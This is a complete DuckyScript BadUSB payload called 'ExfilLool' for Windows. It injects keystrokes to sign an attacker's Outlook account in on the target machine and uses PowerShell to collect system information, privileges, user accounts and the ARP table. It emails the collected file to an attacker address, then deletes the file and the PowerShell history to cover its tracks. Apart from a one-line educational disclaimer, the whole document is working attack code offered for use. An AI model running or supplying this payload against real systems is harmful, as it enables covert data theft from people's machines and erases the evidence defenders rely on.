REM -
REM -       wW    Ww      wW  Ww W  W   W  W       .-.        .-.           _  
REM -   wWw(O)\  /(O)  wWw(O)(O)(O)(O) (O)(O)    c(O_O)c    c(O_O)c  (OO) .' ) 
REM -   (O)_`. \/ .'   (O)_(..)   ||     ||     ,'.---.`,  ,'.---.`,  ||_/ .'  
REM -  .' __) \  /    .' __)||    | \    | \   / /|_|_|\ \/ /|_|_|\ \ |   /    
REM - (  _)   /  \   (  _) _||_   |  `.  |  `. | \_____/ || \_____/ | ||\ \    
REM -  `.__).' /\ `.  )/  (_/\_) (.-.__)(.-.__)'. `---' .`'. `---' .`(/\)\ `.  
REM -      (_.'  `._)(            `-'    `-'     `-...-'    `-...-'       `._) 
REM -
REM - v.1.0
REM - by Jonmar Corpuz
REM -------------------------- 

REM - TOOL USAGE AND INFORMATION
REM - ExfilLool is used as a BadUSB exploit written in DuckyScript that's used used to enumerate data from a compromised Windows system and exfiltrate that data through Outlook.
REM - This tool doesn't require administrator privileges in order to successfully exfiltrate the enumerated data.
REM - You need to first specify the destination Outlook.com email where you want the target machine to sent the data to as well as its corresponding password to allow the payload to log in to the account using Outlook if none exists on the target machine.
REM -------------------------- 

REM - DISCLAIMERS
REM - This tools is made for educational purposes only and you should only test it on machines and systems that you have permission to test or personally own!
REM -------------------------- 

REM - Step 1: Add an Outlook account (If one already exists then the payload will just walk through the commands without changing anything)
REM -------------------------- 

DELAY 500
GUI r
DELAY 500
STRING outlook
DELAY 500
ENTER

DELAY 5000
ALT F
DELAY 500
RIGHT
DELAY 500
ENTER
DELAY 500
STRING <ATTACKER EMAIL>
DELAY 500
ENTER
DELAY 2000
STRING <ATTACKER EMAIL'S PASSWORD>
DELAY 500
ENTER
DELAY 2000
ENTER
DELAY 500
ALT F4
REM -------------------------- 

REM - Step 2: Launch PowerShell.exe 
REM -------------------------- 

DELAY 500
GUI r
DELAY 500
STRING PowerShell.exe
DELAY 500
ENTER
REM -------------------------- 

REM - Step 3: Enumerate the target data and redirect it to a text file
REM -------------------------- 

DELAY 2000
STRING echo 'System information:' > FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING systeminfo >> FILENAME.txt
DELAY 500 
ENTER
DELAY 500
STRING echo '' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING echo 'Current user information:' >> FILENAME.txt
DELAY 500
ENTER
DELAY 700
STRING echo '' >> FILENAME.txt
DELAY 500
ENTER

DELAY 500
STRING whoami >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING whoami /priv >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING echo '' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING echo 'List of users:' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING echo '' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING wmic useraccount list >> FILENAME.txt
DELAY 500
ENTER

DELAY 500
STRING echo '' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING echo 'Network addresses:' >> FILENAME.txt
DELAY 500
ENTER
DELAY 500
STRING arp -a >> FILENAME.txt
DELAY 500
ENTER
REM -------------------------- 

REM - Step 4: Exfiltrate the text file containing the loot using Outlook
REM -------------------------- 

DELAY 500
STRING $PWD = pwd
DELAY 500
ENTER
DELAY 500
STRING $ATTACHMENT = "$PWD\FILENAME.txt"
DELAY 500
ENTER
DELAY 500
STRING $outlook = New-Object -comobject outlook.application
DELAY 500
ENTER
DELAY 500
STRING $email = $outlook.CreateItem(0)
DELAY 500
ENTER
DELAY 500
STRING $email.To = "<ATTACKER EMAIL>"
DELAY 500
ENTER
DELAY 500
STRING $email.Subject = "SUBJECT"
DELAY 500
ENTER
STRING $email.Body = "BODY"
DELAY 500
ENTER
DELAY 500
STRING $email.Attachments.add($ATTACHMENT)
DELAY 500
ENTER
DELAY 500
STRING $email.Send()
DELAY 500
ENTER
DELAY 500
STRING $outlook.Quit()
DELAY 500
ENTER
REM -------------------------- 

REM - Step 5: Erase our tracks from the target machine
REM -------------------------- 

DELAY 500
STRING del FILENAME.txt
DELAY 500
ENTER

DELAY 500
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
DELAY 500
ENTER
REM -------------------------- 

REM - ADDITIONAL COMMANDS
REM - Check PowerShell History: Get-Content (Get-PSReadlineOption).HistorySavePath
REM -------------------------- 
